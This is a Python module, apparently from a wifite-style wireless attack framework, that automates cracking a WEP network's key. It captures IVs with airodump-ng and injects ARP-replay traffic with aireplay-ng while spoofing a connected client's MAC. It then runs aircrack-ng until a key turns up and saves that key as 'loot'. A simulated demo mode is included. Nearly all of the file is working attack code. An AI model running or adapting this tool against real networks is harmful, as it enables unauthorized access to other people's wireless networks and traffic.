"""WEP IV harvesting: ARP-replay against a legacy WEP network."""

from __future__ import annotations

import contextlib
import os
import re
import time
from pathlib import Path
from typing import List, Optional

from ..deps import registry
from ..models import STATUS_FAILED, STATUS_SUCCESS, AccessPoint, Attempt, Capture
from ..util import Process, human_duration, mac_norm, run
from .base import Attack, AttackContext, AttackOutcome

KEY_FOUND_RE = re.compile(r"KEY FOUND!\s*\[?\s*(.*?)\s*\]?\s*$", re.M)
IVS_RE = re.compile(r"#Data:\s*(\d+)")


class WepAttack(Attack):
    name = "wep_ivs"
    label = "WEP IV harvesting"
    tool = "airodump-ng + aireplay-ng --arpreplay"
    description = ("Legacy but still occasionally deployed. Capture the WEP IVs and "
                   "let aircrack-ng recover the key as soon as enough frames exist.")
    requires = ("airodump",)
    applies_to = ("WEP",)

    def applies(self, ap: AccessPoint) -> bool:
        return ap.encryption == "WEP"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool, chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        if ctx.demo:
            return self._run_demo(ctx, ap, attempt)
        return self._run_live(ctx, ap, attempt)

    def _run_demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = min(ctx.config.attack_timeout_for(self.name), 45)
        deadline = time.time() + timeout
        ivs = 0
        while time.time() < deadline and not ctx.want_stop():
            ivs += 2400 + int(time.time() * 7) % 3000
            ctx.progress(f"harvesting WEP IVs from {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=min(95, ivs / 30000 * 100),
                         detail=f"{ivs:,} IVs · ARP replay (simulated)")
            ctx.bus.publish("capture.progress", {
                "label": f"IVs {ivs}", "kind": "wep", "bssid": ap.bssid,
                "value": ivs, "percent": min(95, ivs / 30000 * 100),
            })
            if ivs > 20000 or ctx.radio.wep_ok(ap.bssid) and ivs > 8000:
                password = ctx.radio.crack(ap.bssid, kind="wep").get("password", "")
                ctx.session.stats.wep_cracks += 1
                capture = Capture(kind="wep_ivs", bssid=ap.bssid, essid=ap.essid, path="",
                                  valid=True, tool="aircrack-ng (simulated)",
                                  password=password, crack_tool="aircrack-ng",
                                  extra={"ivs": ivs, "simulated": True})
                ctx.session.add_capture(capture)
                ctx.session.end_attempt(attempt, STATUS_SUCCESS, f"WEP key {password}", "", capture)
                ctx.bus.log(f"WEP key recovered for {ap.display_name}: {password} "
                            f"(simulated, {ivs:,} IVs)", level="success")
                return AttackOutcome.success(f"WEP key {password}", capture, f"{ivs} IVs")
            time.sleep(0.8)
        return self._fail(ctx, attempt, "not enough IVs", f"{ivs} IVs harvested (needs ~20k)")

    def _run_live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = ctx.config.attack_timeout_for(self.name)
        airodump = registry.path("airodump-ng")
        aireplay = registry.path("aireplay-ng")
        if not airodump:
            return self._fail(ctx, attempt, "airodump-ng missing", "install aircrack-ng")
        channel = ap.channel or 1
        ctx.set_channel(channel)
        prefix = ctx.artifact_path("wep", ap, "")
        cap_path = prefix + "-01.cap"
        args = [airodump, ctx.monitor, "-c", str(channel), "--bssid", ap.bssid,
                "-w", prefix, "--output-format", "pcap,csv", "--write-interval", "1",
                "--ivs", "--ignore-negative-one"]
        dump = Process(args, name="airodump-ng", echo_lines=ctx.config.verbose_tools)
        dump.start()
        if dump.error:
            return self._fail(ctx, attempt, "airodump-ng failed", dump.error)

        replay: Optional[Process] = None
        started = time.time()
        key = ""
        ivs = 0
        try:
            # ARP replay needs an associated client MAC (or a fake-auth)
            client = ""
            for candidate in ap.clients.values():
                client = candidate.mac
                break
            if aireplay and client:
                replay = Process([aireplay, "--arpreplay", "-b", ap.bssid, "-h", client,
                                  "--ignore-negative-one", ctx.monitor],
                                 name="aireplay-ng", echo_lines=ctx.config.verbose_tools)
                replay.start()
                ctx.bus.log(f"ARP replay started using client {client}", level="info")
            else:
                ctx.bus.log("no client known: passive IV capture only (slower)", level="warning")

            while not ctx.want_stop() and time.time() - started < timeout:
                time.sleep(2.0)
                if os.path.exists(cap_path):
                    from ..pcap import analyze_file
                    analysis = analyze_file(cap_path, max_packets=120000)
                    ivs = max(ivs, analysis.wep_data)
                    ctx.progress(f"harvesting WEP IVs from {ap.display_name}", kind="capture",
                                 bssid=ap.bssid, percent=min(95, ivs / 30000 * 100),
                                 detail=f"{ivs:,} IVs captured")
                if ivs > 5000 or time.time() - started > timeout * 0.5:
                    cracker = registry.path("aircrack-ng")
                    if cracker and os.path.exists(cap_path):
                        result = run([cracker, "-b", ap.bssid, cap_path], timeout=90)
                        match = KEY_FOUND_RE.search(result.text)
                        if match:
                            key = match.group(1).strip()
                            break
        finally:
            for proc in (replay, dump):
                if proc is not None:
                    with contextlib.suppress(Exception):
                        proc.stop()

        if key:
            capture = Capture(kind="wep_ivs", bssid=ap.bssid, essid=ap.essid, path=cap_path,
                              valid=True, tool="aircrack-ng", password=key,
                              crack_tool="aircrack-ng", extra={"ivs": ivs})
            saved = ctx.session.save_artifact(cap_path, "wep", ctx.loot_name(ap, "wep"))
            capture.path = saved
            ctx.session.stats.wep_cracks += 1
            ctx.session.add_capture(capture)
            ctx.session.end_attempt(attempt, STATUS_SUCCESS, f"WEP key {key}", "", capture)
            ctx.bus.log(f"WEP key recovered for {ap.display_name}: {key}", level="success")
            return AttackOutcome.success(f"WEP key {key}", capture, f"{ivs} IVs")
        return self._fail(ctx, attempt, "not enough IVs for a WEP crack",
                          f"{ivs} IVs harvested in {human_duration(timeout)}")
